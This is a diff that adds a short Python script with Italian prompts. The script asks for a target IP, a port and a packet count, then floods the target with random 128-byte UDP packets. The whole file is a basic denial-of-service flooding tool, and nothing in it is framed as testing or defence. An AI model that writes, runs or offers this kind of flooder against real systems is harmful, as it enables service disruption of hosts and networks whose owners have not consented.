@@ -1,0 +1,15 @@
+import socket
+import random
+import os
+
+target_ip = input("Inserisci il target IP: ")
+target_port = int(input("Inserisci la porta target : "))
+pacchetti = int(input("Inserisci il numero di pacchetti da inviare: "))
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+i = 0
+while i<pacchetti:
+  
+  message = os.urandom(128)
+
+  s.sendto(message, (target_ip, target_port))
+  i+=1
